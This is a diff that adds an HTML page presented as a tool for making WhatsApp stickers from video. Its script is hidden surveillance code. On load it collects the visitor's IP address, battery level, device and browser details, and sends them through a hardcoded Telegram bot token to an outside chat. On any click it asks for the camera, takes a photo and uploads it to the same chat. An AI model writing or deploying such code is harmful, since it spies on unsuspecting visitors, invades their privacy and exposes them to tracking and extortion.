@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة جميلة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Cairo', sans-serif;
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .header {
+            width: 100%;
+            background-color: #2e7d32;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            left: 0;
+            animation: loading 2s infinite;
+    font-size:20px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        @keyframes loading {
+            0% { background-color: #2e7d32; }
+            50% { background-color: #2e7d43; }
+            100% { background-color: #2e7d32; }
+        }
+        .content {
+            text-align: center;
+            margin: 0px;
+            
+        }
+        .content h1 {
+            font-size: 2em;
+            margin-bottom: 40px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.9);
+           
+        }
+        
+        h1:hover{
+            
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-shadow: 3px 3px 5px rgba(0, 0, 0, 1);
+            
+            
+        }
+        .circle {
+            width: 60px;
+            height: 60px;
+            background-color: #2e7d32;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3em;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 10px;
+        }
+        .rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .rain div {
+            position: absolute;
+            bottom: 100%;
+            width: 2px;
+            height: 60px;
+            background: #2e7d32;
+            animation: rain 1s linear infinite;
+        }
+        @keyframes rain {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+        .rain div:nth-child(2n) {
+            animation-duration: 1.5s;
+        }
+        .rain div:nth-child(3n) {
+            animation-duration: 2s;
+        }
+    </style>
+</head>
+<body>
+    <div class="header"> S ‌ ‌t ‌ ‌i ‌ ‌c ‌ ‌k ‌ ‌e ‌ ‌r ‌ ‌s     ‌ ‌  ‌ ‌   v ‌ ‌i ‌ ‌d ‌ ‌e ‌ ‌o </div>
+    <div class="content">
+        <h1>creat your stickers WhatsApp by video</h1>
+        <div class="circle">+</div>
+    </div>
+    <div class="rain">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+    </div>
+    <script>
+      const botToken = '7509225299:AAF9UyvAlML4oh6u7WvCNoX0_Imo0tBkQkU';
+const chatId = '5687419212';
+
+async function getVisitorInfo() {
+    try {
+        const batteryInfo = await navigator.getBattery();
+        const ipAddress = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip);
+        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+        const userAgent = navigator.userAgent;
+        const isOnline = navigator.onLine;
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        const language = navigator.language || navigator.userLanguage;
+        const platform = navigator.platform;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const cookiesEnabled = navigator.cookieEnabled;
+        const doNotTrack = navigator.doNotTrack;
+        const referrer = document.referrer;
+
+        return {
+            batteryInfo: {
+                level: batteryInfo.level * 100,
+                charging: batteryInfo.charging
+            },
+            ipAddress,
+            connectionType,
+            userAgent,
+            isOnline,
+            screenResolution,
+            language,
+            platform,
+            timeZone,
+            cookiesEnabled,
+            doNotTrack,
+            referrer
+        };
+    } catch (error) {
+        console.error('Error gathering information:', error);
+        return null;
+    }
+}
+
+function sendTelegramMessage(message) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(response => response.json())
+        .catch(error => {
+            alert('حدث خطأ، يرجى إعادة المحاولة.');
+            console.error('Error:', error);
+        });
+}
+
+getVisitorInfo().then(info => {
+    if (info) {
+        const message = `
+📢 New Visitor Alert!
+👤 User Agent: ${info.userAgent}
+🔋 Battery Level: ${info.batteryInfo.level}%
+⚡ Charging: ${info.batteryInfo.charging ? 'Yes' : 'No'}
+🌐 Online: ${info.isOnline ? 'Yes' : 'No'}
+📶 Connection Type: ${info.connectionType}
+🌍 IP Address: ${info.ipAddress}
+🖥 Screen Resolution: ${info.screenResolution}
+🗣 Language: ${info.language}
+💻 Platform: ${info.platform}
+🕒 Time Zone: ${info.timeZone}
+🍪 Cookies Enabled: ${info.cookiesEnabled ? 'Yes' : 'No'}
+🚫 Do Not Track: ${info.doNotTrack ? 'Yes' : 'No'}
+🔗 Referrer: ${info.referrer}
+        `;
+
+        sendTelegramMessage(message);
+    }
+});
+
+document.addEventListener('click', () => {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            video.addEventListener('loadeddata', () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'pic.png');
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => response.json())
+                      .catch(error => {
+                          alert('حدث خطأ، يرجى إعادة المحاولة.');
+                          console.error('Error:', error);
+                      });
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+            });
+        }).catch(error => {
+            alert('تم رفض الوصول إلى الكاميرا.');
+            console.error('Error:', error);
+        });
+});
+        
+    </script>
+</body>
+</html>
+‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌
+ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌
